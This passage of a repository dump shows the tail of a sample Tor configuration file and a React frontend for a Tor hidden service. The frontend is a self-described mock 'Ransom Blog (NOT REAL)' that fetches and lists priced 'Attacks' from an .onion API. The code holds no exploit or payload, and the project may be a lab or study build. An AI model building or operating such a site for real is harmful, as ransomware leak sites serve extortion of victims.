## can explain what Tor is if anybody wonders why your IP address is
## contacting them. See contrib/tor-exit-notice.html in Tor's source
## distribution for a sample.
#DirPortFrontPage /etc/tor/tor-exit-notice.html

## Uncomment this if you run more than one Tor relay, and add the identity
## key fingerprint of each Tor relay you control, even if they're on
## different networks. You declare it here so Tor clients can avoid
## using more than one of your relays in a single circuit. See
## https://www.torproject.org/docs/faq#MultipleRelays
## However, you should never include a bridge's fingerprint here, as it would
## break its concealability and potentionally reveal its IP/TCP address.
#MyFamily $keyid,$keyid,...

## A comma-separated list of exit policies. They're considered first
## to last, and the first match wins. If you want to _replace_
## the default exit policy, end this with either a reject *:* or an
## accept *:*. Otherwise, you're _augmenting_ (prepending to) the
## default exit policy. Leave commented to just use the default, which is
## described in the man page or at
## https://www.torproject.org/documentation.html
##
## Look at https://www.torproject.org/faq-abuse.html#TypicalAbuses
## for issues you might encounter if you use the default exit policy.
##
## If certain IPs and ports are blocked externally, e.g. by your firewall,
## you should update your exit policy to reflect this -- otherwise Tor
## users will be told that those destinations are down.
##
## For security, by default Tor rejects connections to private (local)
## networks, including to your public IP address. See the man page entry
## for ExitPolicyRejectPrivate if you want to allow "exit enclaving".
##
#ExitPolicy accept *:6660-6667,reject *:* # allow irc ports but no more
#ExitPolicy accept *:119 # accept nntp as well as default exit policy
#ExitPolicy reject *:* # no exits allowed

## Bridge relays (or "bridges") are Tor relays that aren't listed in the
## main directory. Since there is no complete public list of them, even an
## ISP that filters connections to all the known Tor relays probably
## won't be able to block all the bridges. Also, websites won't treat you
## differently because they won't know you're running Tor. If you can
## be a real relay, please do; but if not, be a bridge!
#BridgeRelay 1
## By default, Tor will advertise your bridge to users through various
## mechanisms like https://bridges.torproject.org/. If you want to run
## a private bridge, for example because you'll give out your bridge
## address manually to your friends, uncomment this line:
#PublishServerDescriptor 0



================================================
File: server/HiddenService/frontend/package.json
================================================
{
  "name": "front",
  "version": "0.1.0",
  "private": true,
  "dependencies": {
    "cra-template": "1.2.0",
    "react": "^19.0.0",
    "react-dom": "^19.0.0",
    "react-scripts": "5.0.1"
  },
  "scripts": {
    "start": "react-scripts start",
    "build": "react-scripts build",
    "test": "react-scripts test",
    "eject": "react-scripts eject"
  },
  "eslintConfig": {
    "extends": [
      "react-app",
      "react-app/jest"
    ]
  },
  "browserslist": {
    "production": [
      ">0.2%",
      "not dead",
      "not op_mini all"
    ],
    "development": [
      "last 1 chrome version",
      "last 1 firefox version",
      "last 1 safari version"
    ]
  }
}


================================================
File: server/HiddenService/frontend/public/index.html
================================================
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <link rel="icon" href="%PUBLIC_URL%/favicon.ico" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="theme-color" content="#000000" />
    <meta
      name="description"
      content="Web site created using create-react-app"
    />
    <link rel="apple-touch-icon" href="%PUBLIC_URL%/logo192.png" />
    <!--
      manifest.json provides metadata used when your web app is installed on a
      user's mobile device or desktop. See https://developers.google.com/web/fundamentals/web-app-manifest/
    -->
    <link rel="manifest" href="%PUBLIC_URL%/manifest.json" />
    <!--
      Notice the use of %PUBLIC_URL% in the tags above.
      It will be replaced with the URL of the `public` folder during the build.
      Only files inside the `public` folder can be referenced from the HTML.

      Unlike "/favicon.ico" or "favicon.ico", "%PUBLIC_URL%/favicon.ico" will
      work correctly both with client-side routing and a non-root public URL.
      Learn how to configure a non-root public URL by running `npm run build`.
    -->
    <title>React App</title>
  </head>
  <body>
    <noscript>You need to enable JavaScript to run this app.</noscript>
    <div id="root"></div>
    <!--
      This HTML file is a template.
      If you open it directly in the browser, you will see an empty page.

      You can add webfonts, meta tags, or analytics to this file.
      The build step will place the bundled scripts into the <body> tag.

      To begin the development, run `npm start` or `yarn start`.
      To create a production bundle, use `npm run build` or `yarn build`.
    -->
  </body>
</html>


================================================
File: server/HiddenService/frontend/public/manifest.json
================================================
{
  "short_name": "React App",
  "name": "Create React App Sample",
  "icons": [
    {
      "src": "favicon.ico",
      "sizes": "64x64 32x32 24x24 16x16",
      "type": "image/x-icon"
    },
    {
      "src": "logo192.png",
      "type": "image/png",
      "sizes": "192x192"
    },
    {
      "src": "logo512.png",
      "type": "image/png",
      "sizes": "512x512"
    }
  ],
  "start_url": ".",
  "display": "standalone",
  "theme_color": "#000000",
  "background_color": "#ffffff"
}


================================================
File: server/HiddenService/frontend/public/robots.txt
================================================
# https://www.robotstxt.org/robotstxt.html
User-agent: *
Disallow:


================================================
File: server/HiddenService/frontend/src/App.css
================================================
.App {
  text-align: center;
}

.App-logo {
  height: 40vmin;
  pointer-events: none;
}

@media (prefers-reduced-motion: no-preference) {
  .App-logo {
    animation: App-logo-spin infinite 20s linear;
  }
}

.App-header {
  background-color: #282c34;
  min-height: 100vh;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  font-size: calc(10px + 2vmin);
  color: white;
}

.App-link {
  color: #61dafb;
}

@keyframes App-logo-spin {
  from {
    transform: rotate(0deg);
  }
  to {
    transform: rotate(360deg);
  }
}


================================================
File: server/HiddenService/frontend/src/App.js
================================================
import React from 'react';
import Posts from './Posts';
import './App.css';

function App() {
  return (
    <div className="App">
      <Posts />
    </div>
  );
}

export default App;


================================================
File: server/HiddenService/frontend/src/Posts.css
================================================
/* Reset */
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
  }
  
  body {
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    background-color: #1b1b2f;
    color: #ffffff;
  }
  
  /* Page Container */
  .page-container {
    display: flex;
    flex-direction: column;
    min-height: 100vh;
    background-color: #1b1b2f;
  }
  
  /* Header */
  .header {
    background-color: #162447;
    padding: 20px;
    text-align: center;
    border-bottom: 1px solid #1f4068;
  }
  
  .header h1 {
    font-size: 2rem;
    color: #e43f5a;
  }
  
  .nav-links {
    margin-top: 10px;
  }
  
  .nav-links a {
    color: #ffffff;
    margin: 0 15px;
    text-decoration: none;
    font-weight: bold;
  }
  
  .nav-links a:hover {
    text-decoration: underline;
  }
  
  /* Main Content */
  .main-content {
    flex: 1;
    padding: 20px;
  }
  
  .posts-section h2{
    font-size: 1.8rem;
    margin-bottom: 20px;
    color: #e43f5a;
  }
  
  /* Grid layout for posts */
  .posts-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
    gap: 20px;
  }
  
  .post-card {
    background-color: #1f4068;
    padding: 15px;
    border-radius: 8px;
    box-shadow: 0 4px 8px rgba(0,0,0,0.2);
    transition: transform 0.3s;
  }
  
  .post-card:hover {
    transform: translateY(-5px);
  }
  
  .post-card h3 {
    margin-bottom: 10px;
    color: #e43f5a;
  }
  
  .post-card p {
    margin-bottom: 10px;
  }
  
  /* Footer */
  .footer {
    background-color: #162447;
    text-align: center;
    padding: 15px;
    border-top: 1px solid #1f4068;
    font-size: 0.9rem;
  }
  

================================================
File: server/HiddenService/frontend/src/Posts.js
================================================
import React, { useState, useEffect } from 'react';
import './Posts.css';

const Posts = () => {
  const [posts, setPosts] = useState([]);

  useEffect(() => {
    fetch('http://m3str3qek4qgd2qlp2r6luqju35dts7vyt5n56n657z5hiwtfgnv62qd.onion/api/posts/')
      .then((res) => res.json())
      .then((data) => setPosts(data))
      .catch((err) => console.error('Error fetching posts:', err));
  }, []);

  return (
    <div className="page-container">
      <header className="header">
        <h1>☣️ M3str3 ☣️</h1>
        <nav className="nav-links">
          <a href="#posts">Attacks</a>
          <a href="#about">About</a>
          <a href="#contact">Contact</a>
        </nav>
      </header>
      <main className="main-content" id="posts">
        <section className="posts-section">
          <h2>Attacks</h2>
          {posts.length === 0 ? (
            <p>Loading posts...</p>
          ) : (
            <div className="posts-grid">
              {posts.map((post) => (
                <div key={post.id} className="post-card">
                  <h3>{post.name}</h3>
                  <p>{post.description}</p>
                  <p>
                    <strong>Price:</strong> {post.price || 'No price'}
                  </p>
                  <p>
                    <strong>Published:</strong> {post.published ? 'Yes' : 'No'}
                  </p>
                </div>
              ))}
            </div>
          )}
        </section>
      </main>
      <footer className="footer" id="contact">
        <p>© {new Date().getFullYear()} Example Ransom Blog (NOT REAL). No rights reserved.</p>
        <p>Contact me: namestre3@protonmail.com</p>
      </footer>
    </div>
  );
};

export default Posts;


================================================
File: server/HiddenService/frontend/src/index.css
================================================
body {
  margin: 0;
  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen',
    'Ubuntu', 'Cantarell', 'Fira Sans', 'Droid Sans', 'Helvetica Neue',
    sans-serif;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
}

code {
  font-family: source-code-pro, Menlo, Monaco, Consolas, 'Courier New',
    monospace;
}


================================================
File: server/HiddenService/frontend/src/index.js
================================================
import React from 'react';
import ReactDOM from 'react-dom/client';
import './index.css';
import App from './App';


const root = ReactDOM.createRoot(document.getElementById('root'));
root.render(
    <App />
);


